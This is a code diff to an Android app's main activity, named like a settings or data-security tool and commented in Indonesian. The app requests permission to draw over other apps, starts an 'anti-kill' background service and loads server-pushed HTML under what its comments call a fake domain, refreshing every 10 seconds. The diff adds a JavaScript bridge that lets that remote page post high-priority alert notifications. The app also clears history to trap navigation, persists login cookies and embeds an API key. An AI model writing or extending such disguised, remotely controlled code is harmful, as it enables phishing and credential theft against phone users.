@@ -1,6 +1,10 @@
 package com.settings.datasecure;
 
 import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.graphics.Color;
@@ -9,6 +13,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.webkit.CookieManager;
+import android.webkit.JavascriptInterface;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
@@ -38,10 +43,55 @@ public class MainActivity extends Activity {
     private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.1&select=html_content";
     private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 
 
+    // --- KELAS JEMBATAN UNTUK MEMANGGIL NOTIF DARI HTML ---
+    public class JembatanWeb {
+        Context mContext;
+
+        JembatanWeb(Context c) {
+            mContext = c;
+        }
+
+        // Fungsi ini bisa dipanggil dari dalam HTML (JavaScript)
+        @JavascriptInterface
+        public void buatNotif(String judul, String pesan) {
+            NotificationManager manager = (NotificationManager) mContext.getSystemService(Context.NOTIFICATION_SERVICE);
+            if (manager == null) return;
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel channel = new NotificationChannel(
+                        "ChannelPemberitahuanWeb",
+                        "Pemberitahuan dari Web",
+                        NotificationManager.IMPORTANCE_HIGH
+                );
+                channel.enableVibration(true);
+                manager.createNotificationChannel(channel);
+            }
+
+            Notification.Builder builder;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                builder = new Notification.Builder(mContext, "ChannelPemberitahuanWeb");
+            } else {
+                builder = new Notification.Builder(mContext)
+                    .setPriority(Notification.PRIORITY_HIGH)
+                    .setDefaults(Notification.DEFAULT_ALL);
+            }
+
+            builder.setContentTitle(judul)
+                   .setContentText(pesan)
+                   .setSmallIcon(android.R.drawable.ic_dialog_alert)
+                   .setAutoCancel(true);
+
+            // Munculkan notifikasi dengan ID acak agar tidak saling menimpa
+            manager.notify((int) System.currentTimeMillis(), builder.build());
+        }
+    }
+    // --------------------------------------------------------
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
+        // Cek Izin Overlay (Tampil di atas aplikasi lain)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             Toast.makeText(this, "Mohon izinkan aplikasi tampil di atas aplikasi lain", Toast.LENGTH_LONG).show();
             Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
@@ -59,13 +109,14 @@ public class MainActivity extends Activity {
                 if (Settings.canDrawOverlays(this)) {
                     tampilkanLayarUtama();
                 } else {
-                    tampilkanLayarUtama();
+                    tampilkanLayarUtama(); // Tetap jalankan meski ditolak (opsional)
                 }
             }
         }
     }
 
     private void tampilkanLayarUtama() {
+        // Menyalakan sistem anti-kill di latar belakang
         try {
             Intent intentOverlay = new Intent(this, LayananBackground.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -82,11 +133,14 @@ public class MainActivity extends Activity {
 
         WebSettings webSettings = webView.getSettings();
         webSettings.setJavaScriptEnabled(true);
-        webSettings.setDomStorageEnabled(true);
+        webSettings.setDomStorageEnabled(true); // Penting untuk penyimpanan website modern
         webSettings.setDatabaseEnabled(true); 
         webSettings.setCacheMode(WebSettings.LOAD_NO_CACHE); 
 
-        // Mengaktifkan penyimpanan sesi login (Cookies)
+        // --- PASANG JEMBATAN KE WEBVIEW ---
+        webView.addJavascriptInterface(new JembatanWeb(this), "AndroidApp");
+
+        // Mengaktifkan penyimpanan sesi login (Cookies) secara permanen
         CookieManager cookieManager = CookieManager.getInstance();
         cookieManager.setAcceptCookie(true);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
@@ -97,6 +151,7 @@ public class MainActivity extends Activity {
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
+                // Hapus memori halaman jika diperintahkan (Anti Back ke HTML lama)
                 if (bersihkanRiwayat) {
                     view.clearHistory(); 
                     bersihkanRiwayat = false;
@@ -111,7 +166,7 @@ public class MainActivity extends Activity {
         
         if (!htmlUtamaTerakhir.isEmpty()) {
             bersihkanRiwayat = true; 
-            // Menggunakan DOMAIN_APP
+            // Memuat web menggunakan Domain Palsu
             webView.loadDataWithBaseURL(DOMAIN_APP, htmlUtamaTerakhir, "text/html", "UTF-8", null);
         }
 
@@ -129,6 +184,7 @@ public class MainActivity extends Activity {
                             koneksi.setRequestProperty("Authorization", "Bearer " + KUNCI_SUPABASE);
                             koneksi.setRequestProperty("Accept", "application/json");
                             
+                            // Mencegah cache API
                             koneksi.setUseCaches(false);
                             koneksi.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate");
                             koneksi.setRequestProperty("Pragma", "no-cache");
@@ -148,6 +204,7 @@ public class MainActivity extends Activity {
                                     JSONObject barisData = dataJson.getJSONObject(0);
                                     final String htmlBaru = barisData.getString("html_content");
 
+                                    // Jika HTML di server berbeda dengan di memori lokal, terapkan perubahan!
                                     if (!htmlBaru.equals(htmlUtamaTerakhir)) {
                                         htmlUtamaTerakhir = htmlBaru;
                                         memori.edit().putString("html_utama", htmlBaru).apply();
@@ -156,7 +213,7 @@ public class MainActivity extends Activity {
                                             @Override
                                             public void run() {
                                                 bersihkanRiwayat = true; 
-                                                // Menggunakan DOMAIN_APP
+                                                // Memuat web menggunakan Domain Palsu
                                                 webView.loadDataWithBaseURL(DOMAIN_APP, htmlBaru, "text/html", "UTF-8", null);
                                             }
                                         });
@@ -170,6 +227,7 @@ public class MainActivity extends Activity {
                     }
                 }).start();
                 
+                // Ulangi pengecekan setiap 10 detik
                 handler.postDelayed(this, 10000); 
             }
         };
@@ -181,6 +239,7 @@ public class MainActivity extends Activity {
         if (webView != null && webView.canGoBack()) {
             webView.goBack();
         } else {
+            // Karena riwayat di clear, tombol back akan me-minimize aplikasi
             moveTaskToBack(true);
         }
     }
@@ -188,7 +247,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onPause() {
         super.onPause();
-        // Memaksa simpan login saat aplikasi di-minimize
+        // Memaksa simpan Cookies (Data Login) saat aplikasi di-minimize
         CookieManager.getInstance().flush();
     }
 
@@ -196,7 +255,7 @@ public class MainActivity extends Activity {
     protected void onDestroy() {
         super.onDestroy();
         handler.removeCallbacksAndMessages(null);
-        // Memaksa simpan login saat aplikasi ditutup paksa
+        // Memaksa simpan Cookies saat aplikasi ditutup paksa
         CookieManager.getInstance().flush(); 
     }
 }
